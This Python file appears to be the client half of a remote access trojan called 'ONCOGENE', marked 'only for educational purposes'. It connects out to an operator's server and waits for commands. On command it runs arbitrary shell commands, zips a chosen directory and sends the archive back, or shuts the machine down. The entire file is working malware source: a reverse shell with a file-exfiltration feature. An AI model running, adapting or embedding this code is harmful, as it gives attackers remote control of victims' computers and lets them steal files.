"""

+-----------------------------------------------------------------------+
|                               ONCOGENE                                |
|    Author: 27016005                                                   |
|    Version: 0.1.1                                                     |
|    Last update: 09-02-2021 (dd-mm-yyyy)                               |
|                                                                       |
|                 [   ONLY FOR EDUCATIONAL PURPOSES   ]                 |
+-----------------------------------------------------------------------+

"""


import os
import socket
import subprocess
import time
from zipfile import ZipFile


class Client:
    def __init__(self, server_ip, port, buffer_size, client_ip):
        self.SERVER_IP = server_ip
        self.PORT = port
        self.BUFFER_SIZE = buffer_size
        self.CLIENT_IP = client_ip
        # self.recvcounter = 0

        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def connectToServer(self):
        self.client.connect((self.SERVER_IP, self.PORT))

    def txtmsg(self):
        print("TextMessageMode: Activated")
        message = self.client.recv(self.BUFFER_SIZE).decode()
        print("Server:", message)
        # self.send(output.encode())
        # self.client.send("[+] Message displayed and closed.".encode("utf-8"))
        time.sleep(2)
        self.client.send("[+] Message displayed and closed.".encode("utf-8"))

    def fakeshell(self):
        """ Shell """

        print("SHELL MODE ENABLED: ")
        msg = (self.client.recv(self.BUFFER_SIZE).decode("utf-8"))
        if "cd" in msg.lower():
            try:
                d = msg[3:].strip()
                os.chdir(d)
                self.client.send("[*] Done".encode("utf-8"))
            except:
                self.client.send("[*] Dir not found / something went wrong.".encode("utf-8"))
        else:

            obj = subprocess.Popen(msg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                                   shell=True)
            output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")
            print("A")
            if output == "" or output == "\n":
                print("B")
                self.client.send("[*] Done".encode("utf-8"))
            else:
                print("C")
                self.client.send(output.encode("utf-8"))

    def filesend(self):
        print("FILE SEND MODE: Enabled")
        filePath = self.client.recv(self.BUFFER_SIZE).decode("utf-8")

        filelist = os.listdir(filePath)
        self.client.send("Success".encode("utf-8"))
        # create a zip archive

        archname = './logs/files.zip'
        archive = ZipFile(archname, 'w')

        for file in filelist:
            archive.write(filePath + '/' + file)

        archive.close()

        # send size
        archivesize = os.path.getsize(archname)
        self.client.send(str(archivesize).encode("utf-8"))

        # send archive
        with open('./logs/files.zip', 'rb') as to_send:
            self.client.send(to_send.read())
            print("Should have worked.")

        # os.remove(archname)

    def getshutdown(self):
        msg = "shutdown /s"
        obj = subprocess.Popen(msg, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE,
                               shell=True)
        output = (obj.stdout.read() + obj.stderr.read()).decode("utf-8", errors="ignore")
        print("A")
        if output == "" or output == "\n":
            print("B")
            self.client.send("[*] Done".encode("utf-8"))
        else:
            print("C")
            self.client.send(output.encode("utf-8"))

    def endless(self):
        while True:
            print("entered loop")
            msg = (self.client.recv(self.BUFFER_SIZE).decode("utf-8"))
            print("message received {msg}")
            if msg == "msg":

                # self.msg()
                print("This is where it reached")
                self.txtmsg()
                print("This is where it reached")
                time.sleep(3)
            elif msg == "shell":
                self.fakeshell()
            elif msg == "sendZip":
                self.filesend()
            elif msg == "shutdown":
                self.getshutdown()
            elif msg == "disconn":
                break
            else:
                print("Server: msg = " + msg)
                self.client.send("[+] Message displayed and closed.".encode("utf-8"))


def main():
    SERVER_IP = "192.168.56.1"  # modify me
    PORT = 1337  # modify me (if you want)
    BUFFER_SIZE = 2048

    try:
        os.mkdir('./logs')
    except FileExistsError:
        pass

    CLIENT = socket.gethostname()
    CLIENT_IP = socket.gethostbyname(CLIENT)
    print(CLIENT_IP)
    client = Client(SERVER_IP, PORT, BUFFER_SIZE, CLIENT_IP)

    client.connectToServer()
    client.endless()


if __name__ == "__main__":
    main()
